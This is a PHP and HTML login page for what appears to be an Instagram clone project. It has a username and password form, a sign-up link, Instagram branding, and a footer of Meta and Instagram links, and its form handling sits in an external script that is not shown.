<?php include ('includes/header.php');

$_SESSION['user'] = [];
session_destroy();

?>

<link rel="stylesheet" href="css/login/styles.css">
</head>

<body>

    <div class="wrapper">
        <div class="header">
            <div class="top">
                <div class="logo">
                    <img src="assets/instagram.png" alt="instagram" style="width: 175px;">
                </div>
                <form class="form" id="loginForm">
                    <div class="input_field">
                        <input type="text" placeholder="Phone number, username, or email" class="input" id="user" required />
                    </div>
                    <div class="input_field">
                        <input type="password" placeholder="Password" class="input" id="password" required />
                    </div>
                    <button class="btn" id="submitButton">Log In</button>
                    <br />
                    <div style="color: red; text-align: center; width: 100%; display: none;" id="errorMessage">
                    Invalid credentials
                    </div>
                </form>
                <div class="or">
                    <div class="line"></div>
                    <p>OR</p>
                    <div class="line"></div>
                </div>
                <div class="dif">
                    <div class="fb">
                        <img src="assets/facebook.png" alt="facebook">
                        <p>Log in with Facebook</p>
                    </div>
                    
                    <div class="forgot">
                        <a href="#">Forgot password?</a>
                    </div>
                </div>
            </div>
            <div class="signup">
                <p>Don't have an account? <a href="register.php">Sign up</a></p>
            </div>
            <div class="apps">
                <p>Get the app.</p>
                <div class="icons">
                    <a href="#"><img src="assets/appstore.png" alt="appstore"></a>
                    <a href="#"><img src="assets/googleplay.png" alt="googleplay"></a>
                </div>
            </div>
        </div>
        <div class="footer">
            <div class="footer-1">
                <a href="https://about.meta.com/" target="_blank">
                    <p>Meta</p>
                </a>
                <a href="https://about.instagram.com/" target="_blank">
                    <p>About</p>
                </a>
                <a href="https://about.instagram.com/blog" target="_blank">
                    <p>Blog</p>
                </a>
                <a href="https://about.instagram.com/about-us/careers" style="text-decoration: none;">
                    <p>Jobs</p>
                </a>
                <a href="https://help.instagram.com/" target="_blank">
                    <p>Help</p>
                </a>
                <a href="https://developers.facebook.com/docs/instagram" target="_blank">
                    <p>API</p>
                </a>
                <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect"
                    style="text-decoration: none;">
                    <p>Privacy</p>
                </a>
                <a href="https://help.instagram.com/581066165581870/" style="text-decoration: none;">
                    <p>Terms</p>
                </a>
                <a href="https://www.instagram.com/explore/locations/" style="text-decoration: none;">
                    <p>Locations</p>
                </a>
                <a href="https://www.instagram.com/web/lite/" style="text-decoration: none;">
                    <p>Instagram Lite</p>
                </a>
                <a href="https://www.threads.net/" target="_blank">
                    <p>Threads</p>
                </a>
                <a href="https://www.facebook.com/help/instagram/261704639352628" style="text-decoration: none;">
                    <p>Contact Uploading & Non-Users</p>
                </a>
                <a href="https://about.meta.com/technologies/meta-verified/" target="_blank">
                    <p>Meta Verified</p>
                </a>
            </div>

            <div class="footer-2">
                <p>English</p>
                <p>© 2024 Instagram from Meta</p>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <script src="js/login/index.js"></script>